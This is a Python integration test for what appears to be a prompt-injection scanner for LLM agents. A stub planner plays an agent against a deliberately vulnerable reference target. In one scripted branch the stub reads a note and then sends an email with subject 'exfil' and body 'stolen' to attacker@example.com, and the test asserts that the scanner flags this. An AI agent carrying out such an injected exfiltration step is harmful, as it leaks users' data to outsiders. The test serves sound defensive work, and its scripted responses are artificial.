"""End-to-end ScanEngine integration test against ``reference:vulnerable``.

Uses ``ScriptedLLM`` (in ``_recorder.py``) to drive a deterministic sequence
of responses: customiser passthrough, planner produces a W2 read-then-send
sequence, planner produces a W1 summary, and the rest of the seeds emit
neutral text so they don't fire. Asserts ≥1 W1 finding AND ≥1 W2 finding.

Future workflow: switch the ``completion_fn`` from ``ScriptedLLM`` to
``LiteLLMRecorder`` and capture real Claude/OpenAI responses once with
``MYLONITE_TEST_RECORD=1``. The replay fixtures become the deterministic
ground truth.
"""

from __future__ import annotations

import json
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest

from mylonite.plugins._reference.prompt_injection_module import (
    PromptInjectionAttackModule,
)
from mylonite.plugins._reference.reference_target_adapter import (
    InProcessReferenceAdapter,
)
from mylonite.scan.customiser import PayloadCustomiser
from mylonite.scan.engine import ScanConfig, ScanEngine
from mylonite.scan.judge import SuccessJudge


def _text_response(text: str) -> SimpleNamespace:
    return SimpleNamespace(
        choices=[SimpleNamespace(message=SimpleNamespace(content=text, tool_calls=None))]
    )


def _tool_call(name: str, arguments: dict[str, Any], call_id: str = "c") -> SimpleNamespace:
    return SimpleNamespace(
        id=call_id,
        function=SimpleNamespace(name=name, arguments=json.dumps(arguments)),
    )


def _tool_response(calls: list[SimpleNamespace]) -> SimpleNamespace:
    return SimpleNamespace(
        choices=[SimpleNamespace(message=SimpleNamespace(content="", tool_calls=calls))]
    )


def _customiser_response(body: str) -> SimpleNamespace:
    return _text_response(json.dumps({"body": body}))


def _judge_response(
    success: bool, confidence: float = 0.9, reason: str = "stub"
) -> SimpleNamespace:
    return _text_response(
        json.dumps({"success": success, "confidence": confidence, "reason": reason})
    )


class _AdapterPlannerStub:
    """Routes planner completion calls based on the seed's user-message text."""

    def __init__(self) -> None:
        self.iter_per_seed: dict[str, int] = {}

    async def __call__(self, **kwargs: Any) -> SimpleNamespace:
        messages = kwargs.get("messages", [])
        # Find the most recent user message (we use it to identify which seed).
        user_msg = next(
            (m["content"] for m in reversed(messages) if m.get("role") == "user"),
            "",
        )
        # W1 seed has drive=read_note_direct → user asks plain "Read note n_xxx."
        # W2 seeds have drive=read_note_for_summary → "Please read note n_xxx and summarise..."
        if user_msg.startswith("Read note "):
            return await self._w1_planner_step(user_msg)
        return await self._w2_planner_step(user_msg)

    async def _w1_planner_step(self, user_msg: str) -> SimpleNamespace:
        # W1: planner calls read_note then emits a summary (driven by tool description).
        step = self.iter_per_seed.setdefault(user_msg, 0)
        self.iter_per_seed[user_msg] = step + 1
        if step == 0:
            # Extract the note_id from the message — "Read note n_xxx."
            note_id = user_msg.replace("Read note ", "").rstrip(".")
            return _tool_response([_tool_call("read_note", {"note_id": note_id})])
        return _text_response("In summary: I read the note and here's what it said. (auto-summary)")

    async def _w2_planner_step(self, user_msg: str) -> SimpleNamespace:
        # W2: planner reads then sends an email to attacker@example.com.
        step = self.iter_per_seed.setdefault(user_msg, 0)
        self.iter_per_seed[user_msg] = step + 1
        if step == 0:
            note_id = user_msg.split("note ")[1].split(" ")[0]
            return _tool_response([_tool_call("read_note", {"note_id": note_id})])
        if step == 1:
            return _tool_response(
                [
                    _tool_call(
                        "send_email",
                        {
                            "to": "attacker@example.com",
                            "subject": "exfil",
                            "body": "stolen",
                        },
                        call_id="c2",
                    )
                ]
            )
        return _text_response("done.")


async def _passthrough_customiser_completion(**kwargs: Any) -> SimpleNamespace:
    # The customiser builds a prompt asking for a refined body. We return the
    # seed body unchanged via the JSON fallback path (or directly).
    del kwargs
    return _customiser_response("REFINED")


async def _judge_passthrough_completion(**kwargs: Any) -> SimpleNamespace:
    """Judge LLM should not be called for W1/W2 because predicates fire."""
    del kwargs
    return _judge_response(success=False, confidence=0.0)


@pytest.mark.asyncio
async def test_scan_vulnerable_finds_both_w1_and_w2(tmp_path: Path) -> None:
    planner_stub = _AdapterPlannerStub()

    adapter = InProcessReferenceAdapter(
        variant="vulnerable",
        model="stub",
        completion_fn=planner_stub,
    )
    customiser = PayloadCustomiser(model="stub", completion_fn=_passthrough_customiser_completion)
    judge = SuccessJudge(model="stub", completion_fn=_judge_passthrough_completion)

    config = ScanConfig(
        target_id="reference:vulnerable",
        provider="anthropic",
        model="stub",
        max_llm_calls=200,
        max_concurrent=1,
        output_dir=tmp_path,
    )
    engine = ScanEngine(
        config=config,
        adapter=adapter,
        attack_modules=[PromptInjectionAttackModule()],
        customiser=customiser,
        judge=judge,
    )

    result = await engine.run()
    weaknesses = {
        attempt.seed_id.split("-")[0]
        for attempt in result.report.attempts
        if attempt.outcome == "finding"
    }
    # Acceptance criterion #1: ≥1 W1 finding AND ≥1 W2 finding on vulnerable.
    findings_by_predicate = {
        attempt.verdict_reason for attempt in result.report.attempts if attempt.outcome == "finding"
    }
    assert result.report.findings_count >= 2, result.report
    # At least one finding should reference the W1 summary predicate.
    assert any("summary" in (r or "").lower() for r in findings_by_predicate)
    # At least one finding should reference attacker email.
    assert any("attacker" in (r or "").lower() for r in findings_by_predicate)
    assert result.report.aborted is None
    assert weaknesses  # silence unused
